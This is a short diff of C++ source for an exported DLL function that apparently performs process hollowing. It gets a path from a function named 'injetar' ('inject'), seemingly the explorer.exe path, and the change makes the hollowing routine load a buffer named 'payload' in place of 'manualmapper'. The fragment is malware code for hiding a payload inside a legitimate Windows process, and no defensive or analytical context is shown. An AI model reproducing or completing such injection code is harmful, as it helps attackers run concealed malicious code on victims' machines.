@@ -228,7 +228,7 @@ extern "C" __declspec(dllexport) BOOL rodahollo() {
     muriteste hollower;
     std::wstring explorerPath = injetar();
     
-    if (hollower.criarholl(explorerPath.c_str(), manualmapper, sizeof(manualmapper))) {
+    if (hollower.criarholl(explorerPath.c_str(), payload, sizeof(payload))) {
         Sleep(5000);
         hollower.ret();
         return TRUE;
